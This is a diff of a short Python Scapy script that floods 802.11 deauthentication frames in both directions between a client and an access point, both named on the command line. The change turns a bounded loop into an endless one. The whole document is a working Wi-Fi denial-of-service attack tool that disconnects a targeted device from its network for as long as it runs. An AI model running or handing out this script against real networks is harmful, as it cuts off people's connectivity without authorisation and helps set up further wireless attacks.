@@ -2,46 +2,40 @@ from scapy.all import *
 import os
 import sys
 
-
+### Client MAC address
 client = sys.argv[1]
+### AP MAC address
 ap = sys.argv[2]
-nic = sys.argv[3]
-# 802.11 frame
-# addr1: 3C:22:FB:73:44:97 
-# addr2: source MAC
-# addr3: B4:75:0E:DF:9B:C5
+### Interafce name 
+interface = sys.argv[3]
 
-# stack them up
 
-# Deauthentication Packet For Access Point
+### RadioTap()/Dot11
+# addr1: destination MAC address
+# addr2: source MAC address
+# addr3: BSSID - AP MAC address
+
+### Deauthentication packet from client to AP.
 pkt_to_ap = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
 
-# Deauthentication Packet For Client
+### Deauthentication packet from AP to client.
 pkt_to_c = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()
 
-#dot11 = Dot11(addr1=client, addr2=ap, addr3=ap)
-#dot22 = Dot11(addr1=ap, addr2=client, addr3=client)
-# packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-#pkt_to_ap = RadioTap()/dot11/Dot11Deauth(reason=7)
-#pkt_to_c = RadioTap()/dot22/Dot11Deauth(reason=7)
+# count=100
 
-count=100
-
-while count != 0:
+# while count != 0:
+while True:
 	for i in range(50):
 
-		print ("sending client to ap")
-		#sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
-		sendp(pkt_to_ap, iface=nic)
-		print ("sending ap to client")
-		#sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
-		sendp(pkt_to_c, iface=nic)
+		print ("Sending deauthentication packet from client to AP")
+		# sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
+		sendp(pkt_to_ap, iface=interface)
+		
+		print ("Sending deauthentication packet from AP to client")
+		# sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
+		sendp(pkt_to_c, iface=interface)
 
 
-	count-=1
+	# count-=1
 
-
-
-# send the packet
-#sendp(packet, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
 
